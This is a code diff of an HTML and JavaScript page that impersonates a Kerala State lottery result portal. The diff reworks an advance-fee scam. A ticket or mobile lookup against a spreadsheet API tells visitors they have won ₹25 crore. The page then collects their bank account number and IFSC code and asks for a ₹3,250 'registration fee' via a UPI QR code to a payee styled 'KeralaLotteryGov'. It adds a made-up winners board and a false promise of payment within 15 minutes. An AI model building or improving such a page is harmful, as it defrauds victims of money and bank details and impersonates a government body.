@@ -3,40 +3,212 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kerala Lottery Result Portal</title>
+  <title>Kerala State Lottery - Live Result Portal</title>
   <style>
-    * { box-sizing: border-box; font-family: sans-serif; margin: 0; padding: 0; }
-    body { background: radial-gradient(circle, #1a0b2e, #05010a); color: #fff; padding: 12px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-    .card { width: 100%; max-width: 420px; background: rgba(26, 12, 53, 0.95); border: 1px solid #facc15; border-radius: 12px; padding: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.8); }
-    .top-bar { background: #b45309; color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-    .clock { background: #0f0521; border: 1px solid #5b21b6; color: #fde047; text-align: center; padding: 6px; font-size: 12px; font-weight: bold; border-radius: 6px; margin-bottom: 12px; }
-    input { width: 100%; padding: 10px; margin: 6px 0 10px; border-radius: 6px; border: 1px solid #5b21b6; background: #0a0314; color: #fff; outline: none; }
-    .btn { width: 100%; padding: 12px; background: #facc15; color: #1a0b2e; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; }
-    .pay-btn { background: #22c55e; color: #fff; margin-top: 10px; }
-    #resBox, #feeBox, #bankFormBox { margin-top: 12px; }
-    #resBox, #feeBox { display: none; }
-    .info-box { background: #0d041c; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; border: 1px solid #3b1464; }
-    .info-box div { display: flex; justify-content: space-between; padding: 5px 0; }
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: radial-gradient(circle, #1a0b2e, #05010a);
+      color: #fff;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: rgba(26, 12, 53, 0.95);
+      border: 1px solid #facc15;
+      border-radius: 12px;
+      padding: 15px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.8);
+    }
+    .top-bar {
+      background: #b45309;
+      color: #fff;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: bold;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .live-clock-box {
+      background: #0f0521;
+      border: 1px solid #5b21b6;
+      color: #fde047;
+      text-align: center;
+      padding: 8px;
+      font-size: 13px;
+      font-weight: bold;
+      border-radius: 6px;
+      margin-bottom: 12px;
+    }
+    .live-clock-box .live-tag {
+      display: block;
+      color: #ef4444;
+      font-size: 11px;
+      letter-spacing: 1.5px;
+      margin-top: 2px;
+    }
+    input {
+      width: 100%;
+      padding: 11px;
+      margin: 6px 0 10px;
+      border-radius: 6px;
+      border: 1px solid #5b21b6;
+      background: #0a0314;
+      color: #fff;
+      outline: none;
+      font-size: 14px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #facc15;
+      color: #1a0b2e;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: 0.2s;
+    }
+    .btn:active {
+      transform: scale(0.98);
+    }
+    .btn-withdraw {
+      background: #22c55e;
+      color: #fff;
+      margin-top: 10px;
+    }
+    .btn-pay {
+      background: #22c55e;
+      color: #fff;
+      margin-top: 10px;
+    }
+    .festival-banner {
+      width: 100%;
+      height: 140px;
+      object-fit: cover;
+      border-radius: 8px;
+      border: 1px solid #ca8a04;
+      margin: 14px 0;
+    }
+    .info-box {
+      background: #0d041c;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-size: 13px;
+      border: 1px solid #3b1464;
+    }
+    .info-box div {
+      display: flex;
+      justify-content: space-between;
+      padding: 5px 0;
+    }
+    .winner-board {
+      background: #0a0314;
+      border: 1px solid #5b21b6;
+      border-radius: 8px;
+      padding: 12px;
+      margin-top: 15px;
+    }
+    .winner-scroll {
+      max-height: 220px;
+      overflow-y: auto;
+      margin-top: 8px;
+      padding-right: 4px;
+    }
+    .winner-scroll::-webkit-scrollbar {
+      width: 4px;
+    }
+    .winner-scroll::-webkit-scrollbar-thumb {
+      background: #ca8a04;
+      border-radius: 4px;
+    }
+    .winner-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+      border-bottom: 1px dashed #331557;
+      font-size: 12px;
+    }
+    #resBox, #bankFormBox, #feeBox {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
   <div class="card">
+    <!-- Top Helpline -->
     <div class="top-bar">
       <span>📞 24x7 HELPLINE: +91 8709171965</span>
       <a href="tel:8709171965" style="background:#22c55e; color:#fff; padding:4px 8px; border-radius:4px; text-decoration:none;">Call</a>
     </div>
 
-    <div class="clock" id="liveClock">Loading Live Time...</div>
+    <!-- Live Date Time Header -->
+    <div class="live-clock-box">
+      <div id="liveClock">Loading Live Time...</div>
+      <span class="live-tag">🔴 LIVE RESULT KERALA STATE</span>
+    </div>
 
+    <!-- Verification Search -->
     <h3 style="text-align:center; color:#fde047; margin-bottom:8px;">Kerala Lottery Verification</h3>
-    <input type="text" id="tktInput" placeholder="Ticket No (e.g. KL 254635) / Mobile">
+    <input type="text" id="tktInput" placeholder="Ticket No (e.g. KL 852656) / Mobile">
     <button class="btn" onclick="checkWinner()">Check Result</button>
     <p id="msg" style="text-align:center; font-size:12px; margin-top:8px;"></p>
 
-    <!-- Result Box -->
+    <!-- Kerala Festival Wallpaper Banner -->
+    <img src="https://images.unsplash.com/photo-1609137144813-7d9921338f24?auto=format&fit=crop&w=700&q=80" alt="Kerala Festival" class="festival-banner">
+
+    <!-- STEP 1: Search Result Info -->
     <div id="resBox">
-      <!-- Status Box -->
+      <div style="background:#2e1065; border:1px solid #facc15; border-radius:8px; padding:10px; text-align:center; margin-bottom:10px;">
+        <h4 style="color:#fde047; font-size:14px;">🎉 CONGRATULATIONS WINNER!</h4>
+        <p style="font-size:11px; color:#cbd5e1;">Your winning record has been verified.</p>
+      </div>
+
+      <div class="info-box">
+        <div style="font-weight:bold; color:#fde047; border-bottom:1px solid #3b1464; padding-bottom:5px; margin-bottom:4px;">
+          <span>Detail</span><span>Value</span>
+        </div>
+        <div><span style="color:#aaa;">Customer Name:</span><b id="cName">-</b></div>
+        <div><span style="color:#aaa;">Ticket Number:</span><b id="cTicket">-</b></div>
+        <div><span style="color:#aaa;">Mobile Number:</span><b id="cMobile">-</b></div>
+        <div><span style="color:#aaa;">Prize Level:</span><b id="cLevel" style="color:#facc15;">1st Prize</b></div>
+        <div style="border-top:1px dashed #331557; padding-top:6px; margin-top:4px;">
+          <span style="color:#aaa;">Winning Prize:</span><b id="pAmt" style="color:#4ade80; font-size:16px;">₹25,00,00,000</b>
+        </div>
+      </div>
+
+      <button class="btn btn-withdraw" onclick="showBankForm()">Withdraw Prize Money</button>
+    </div>
+
+    <!-- STEP 2: Bank Withdraw Form -->
+    <div id="bankFormBox" style="margin-top:12px;">
+      <h4 style="color:#fde047; margin:8px 0 6px;">Enter Bank Withdrawal Details:</h4>
+      <input type="text" id="wName" placeholder="Account Holder Name">
+      <input type="text" id="wBank" placeholder="Bank Name">
+      <input type="text" id="wAcc" placeholder="Account Number">
+      <input type="text" id="wIfsc" placeholder="IFSC Code" style="text-transform:uppercase;">
+      <button class="btn" onclick="openPayment()">Submit Withdrawal Details</button>
+    </div>
+
+    <!-- STEP 3: Review + Warnings + QR Code Panel -->
+    <div id="feeBox" style="margin-top:12px;">
+      <!-- Request Under Review Status -->
       <div style="background:#2e1065; border:1px solid #facc15; border-radius:8px; padding:12px; text-align:center; margin-bottom:12px;">
         <h4 style="color:#fde047; font-size:15px; margin-bottom:4px;">*Request Under Review*</h4>
         <p style="font-size:11px; color:#cbd5e1; margin-bottom:8px;">Kerala State withdrawal request submitted successfully.</p>
@@ -45,7 +217,7 @@
         </span>
       </div>
 
-      <!-- Details Box -->
+      <!-- Account Summary Card -->
       <div class="info-box">
         <div style="font-weight:bold; color:#fde047; border-bottom:1px solid #3b1464; padding-bottom:6px; margin-bottom:4px;">
           <span>Details</span><span>Details</span>
@@ -55,33 +227,23 @@
         <div><span style="color:#aaa;">Account No:</span><b id="dispAcc">-</b></div>
         <div><span style="color:#aaa;">IFSC Code:</span><b id="dispIfsc">-</b></div>
         <div style="border-top:1px dashed #331557; padding-top:6px; margin-top:4px;">
-          <span style="color:#aaa;">Prize Amount:</span><b id="pAmt" style="color:#4ade80; font-size:15px;">₹25,00,00,000</b>
+          <span style="color:#aaa;">Prize Amount:</span><b id="dispAmt" style="color:#4ade80; font-size:15px;">₹25,00,00,000</b>
         </div>
       </div>
 
-      <!-- Notice -->
+      <!-- 15-Minute Confirmation Banner -->
       <div style="background:#0a2912; border:1px solid #16a34a; border-radius:6px; padding:8px 10px; font-size:11px; color:#86efac; margin-bottom:10px;">
         ✅ <b>Amount will be credited into your account within 15 minutes.</b><br>
         <span style="color:#bbf7d0; font-size:10px;">Transfer will be initiated upon Kerala State Admin approval.</span>
       </div>
 
-      <!-- Warning Box -->
+      <!-- Government Warning Card -->
       <div style="background:linear-gradient(135deg, #eab308, #ca8a04); color:#000; padding:10px; border-radius:8px; font-size:11px; line-height:1.4; margin-bottom:12px; font-weight:500;">
         ⚠️ <b>Dear Customer:</b> Registration charge shown on this page: Rs. <span id="warnFee">3,250</span>/-. Please verify any government charge directly with the Kerala State Lotteries Department before making a payment. This page is not an official government payment portal.
       </div>
 
-      <!-- Withdraw Form -->
-      <div id="bankFormBox">
-        <h4 style="color:#fde047; margin:8px 0 6px;">Bank Withdraw Form:</h4>
-        <input type="text" id="wName" placeholder="Account Holder Name">
-        <input type="text" id="wBank" placeholder="Bank Name">
-        <input type="text" id="wAcc" placeholder="Account Number">
-        <input type="text" id="wIfsc" placeholder="IFSC Code" style="text-transform:uppercase;">
-        <button class="btn" onclick="openPayment()">Submit & Proceed to Fee</button>
-      </div>
-
-      <!-- QR Fee Box -->
-      <div id="feeBox" style="text-align:center; background:#0d041c; border:1px solid #5b21b6; border-radius:8px; padding:12px;">
+      <!-- QR Payment Box -->
+      <div style="text-align:center; background:#0d041c; border:1px solid #5b21b6; border-radius:8px; padding:12px;">
         <p style="font-size:13px; font-weight:bold; color:#fde047; margin-bottom:8px;">
           🔒 PAY REGISTRATION FEE TO WITHDRAW
         </p>
@@ -89,8 +251,55 @@
           <img id="qrImg" src="" width="160" height="160" alt="UPI QR">
         </div>
         <p id="upiTxt" style="font-size:12px; color:#cbd5e1; margin-top:4px;">UPI ID: -</p>
-        <button class="btn pay-btn" onclick="payUpi()">Pay ₹<span id="btnFee">3250</span> via UPI App</button>
+        <button class="btn btn-pay" onclick="payUpi()">Pay ₹<span id="btnFee">3250</span> via UPI App</button>
         <p style="font-size:10px; color:#888; margin-top:8px;">Once payment is verified, the prize money will be credited.</p>
+      </div>
+    </div>
+
+    <!-- Random Winners Board (1st to 10th Prize) -->
+    <div class="winner-board">
+      <h4 style="color:#fde047; font-size:13px; letter-spacing:0.5px; text-align:center; margin-bottom:4px;">🏆 TOP WINNING TICKETS</h4>
+      <div class="winner-scroll">
+        <div class="winner-row">
+          <div><b>1st Prize (1 Person)</b><br><small style="color:#94a3b8;">KL 852656</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹25 Crore</span>
+        </div>
+        <div class="winner-row">
+          <div><b>2nd Prize (1 Person)</b><br><small style="color:#94a3b8;">KL 419208</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹10 Crore</span>
+        </div>
+        <div class="winner-row">
+          <div><b>3rd Prize (1 Person)</b><br><small style="color:#94a3b8;">KL 604812</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹75 Lakh</span>
+        </div>
+        <div class="winner-row">
+          <div><b>4th Prize (12 Person)</b><br><small style="color:#94a3b8;">KL 382910</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹25 Lakh</span>
+        </div>
+        <div class="winner-row">
+          <div><b>5th Prize (16 Person)</b><br><small style="color:#94a3b8;">KL 749215</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹12 Lakh</span>
+        </div>
+        <div class="winner-row">
+          <div><b>6th Prize (36 Person)</b><br><small style="color:#94a3b8;">KL 184029</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹1 Lakh</span>
+        </div>
+        <div class="winner-row">
+          <div><b>7th Prize (99 Person)</b><br><small style="color:#94a3b8;">KL 593021</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹75,000</span>
+        </div>
+        <div class="winner-row">
+          <div><b>8th Prize (120 Person)</b><br><small style="color:#94a3b8;">KL 920148</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹25,000</span>
+        </div>
+        <div class="winner-row">
+          <div><b>9th Prize (179 Person)</b><br><small style="color:#94a3b8;">KL 302914</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹10,000</span>
+        </div>
+        <div class="winner-row">
+          <div><b>10th Prize (200 Person)</b><br><small style="color:#94a3b8;">KL 849102</small></div>
+          <span style="color:#4ade80; font-weight:bold;">₹2,500</span>
+        </div>
       </div>
     </div>
   </div>
@@ -99,8 +308,9 @@
     var API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
     var fee = "3250";
     var upi = "keralaLottery@paytm";
+    var currentWinningAmt = "₹25,00,00,000";
 
-    // 1. Clock timer
+    // 1. Live Clock
     setInterval(function() {
       var d = new Date();
       var clockElem = document.getElementById("liveClock");
@@ -109,7 +319,7 @@
       }
     }, 1000);
 
-    // 2. Check ticket winner
+    // 2. Check Winner Ticket
     function checkWinner() {
       var q = document.getElementById("tktInput").value.trim().toLowerCase();
       var msg = document.getElementById("msg");
@@ -139,8 +349,13 @@
 
           if (r) {
             msg.textContent = "";
-            document.getElementById("pAmt").textContent = r.amount || "₹25,00,00,000";
-            document.getElementById("dispName").textContent = r.name || "-";
+            currentWinningAmt = r.amount || "₹25,00,00,000";
+            
+            document.getElementById("cName").textContent = r.name || "-";
+            document.getElementById("cTicket").textContent = r.ticket || q.toUpperCase();
+            document.getElementById("cMobile").textContent = r.mobile || "-";
+            document.getElementById("cLevel").textContent = r.level || "1st Prize";
+            document.getElementById("pAmt").textContent = currentWinningAmt;
             document.getElementById("wName").value = r.name || "";
             
             fee = r.fee || "3250";
@@ -150,8 +365,9 @@
             document.getElementById("btnFee").textContent = fee;
 
             document.getElementById("resBox").style.display = "block";
+            document.getElementById("bankFormBox").style.display = "none";
             document.getElementById("feeBox").style.display = "none";
-            document.getElementById("bankFormBox").style.display = "block";
+            document.getElementById("resBox").scrollIntoView({ behavior: 'smooth' });
           } else {
             msg.textContent = "Koi record nahi mila!";
             msg.style.color = "#f87171";
@@ -163,7 +379,13 @@
         });
     }
 
-    // 3. Bank details submit and show QR
+    // 3. Show Bank Form
+    function showBankForm() {
+      document.getElementById("bankFormBox").style.display = "block";
+      document.getElementById("bankFormBox").scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // 4. Submit Bank & Open Payment Review
     function openPayment() {
       var n = document.getElementById("wName").value.trim();
       var b = document.getElementById("wBank").value.trim();
@@ -179,21 +401,23 @@
       document.getElementById("dispBank").textContent = b;
       document.getElementById("dispAcc").textContent = a.length > 4 ? "*******" + a.slice(-4) : a;
       document.getElementById("dispIfsc").textContent = i.toUpperCase();
+      document.getElementById("dispAmt").textContent = currentWinningAmt;
 
       var upiUrl = "upi://pay?pa=" + encodeURIComponent(upi) + "&pn=KeralaLotteryGov&am=" + fee + "&cu=INR&tn=RegistrationFee";
       document.getElementById("qrImg").src = "https://quickchart.io/qr?text=" + encodeURIComponent(upiUrl) + "&size=160";
       document.getElementById("upiTxt").textContent = "UPI ID: " + upi;
 
+      document.getElementById("resBox").style.display = "none";
       document.getElementById("bankFormBox").style.display = "none";
       document.getElementById("feeBox").style.display = "block";
       document.getElementById("feeBox").scrollIntoView({ behavior: 'smooth' });
     }
 
-    // 4. UPI Pay click
+    // 5. Pay UPI Redirect
     function payUpi() {
       var upiUrl = "upi://pay?pa=" + encodeURIComponent(upi) + "&pn=KeralaLotteryGov&am=" + fee + "&cu=INR&tn=RegistrationFee";
       window.location.href = upiUrl;
     }
   </script>
 </body>
-</html>
+  </html>
